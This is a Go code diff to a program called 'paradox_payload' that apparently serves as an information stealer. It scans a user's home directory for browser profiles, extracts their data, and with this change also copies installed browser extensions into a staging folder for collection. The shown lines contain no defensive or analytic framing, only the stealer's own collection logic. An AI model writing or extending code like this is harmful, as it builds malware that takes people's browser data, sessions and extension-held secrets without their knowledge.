@@ -10,7 +10,6 @@ import (
 	"paradox_payload/fileops"
 )
 
-// BuildID will be set by the linker
 var BuildID string
 
 func createOutputDir(path string) error {
@@ -22,7 +21,6 @@ func createOutputDir(path string) error {
 }
 
 func main() {
-	// Print the received BuildID (optional, for verification)
 	fmt.Printf("Payload running with BuildID: %s\n", BuildID)
 
 	fmt.Println("Starting discovery and collection...")
@@ -89,16 +87,23 @@ func main() {
 	}
 
 	fmt.Println("Discovering browser profiles...")
-	browserProfiles, err := discovery.CheckBrowserDirectories(homeDir)
+	browserProfiles, browserExtensions, err := discovery.CheckBrowserDirectories(homeDir)
 	if err != nil {
 		fmt.Printf("Warning: Error during browser discovery: %v\n", err)
 	}
 	fmt.Printf("Found %d potential browser profiles.\n", len(browserProfiles))
-
+	fmt.Printf("Found %d potential browser extensions.\n", len(browserExtensions))
 	fmt.Println("Extracting browser data...")
+
 	extractionErrors := 0
 	for _, profile := range browserProfiles {
 		if err := extraction.ExtractBrowserData(profile, outPaths["Browsers"]); err != nil {
+			fmt.Printf("    %v\n", err)
+			extractionErrors++
+		}
+	}
+	for _, extension := range browserExtensions {
+		if err := fileops.CopyDir(extension.Path, filepath.Join(outPaths["Browsers"], extension.BrowserName, extension.ExtensionID, extension.ExtensionName)); err != nil {
 			fmt.Printf("    %v\n", err)
 			extractionErrors++
 		}
